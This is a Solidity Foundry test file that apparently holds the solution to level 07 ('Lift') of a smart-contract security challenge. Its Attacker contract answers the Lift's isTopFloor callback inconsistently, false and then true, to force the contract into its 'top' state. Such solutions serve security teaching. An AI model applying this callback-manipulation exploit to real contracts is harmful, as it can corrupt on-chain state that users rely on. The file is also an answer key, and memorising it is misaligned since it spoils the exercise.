// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;

    function setUp() public override {
        super.setUp();
        instance = new Lift();
    }

    function testExploitLevel() public {
        Attacker attacker = new Attacker(instance);
        attacker.exploit(10);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Attacker is House {
    Lift instance;
    bool toggle;

    constructor(Lift _instance) {
        instance = _instance;
    }

    function exploit(uint256 _floor) public {
        instance.goToFloor(_floor);
    }

    function isTopFloor(uint256) external override returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        } else {
            return true;
        }
    }
}
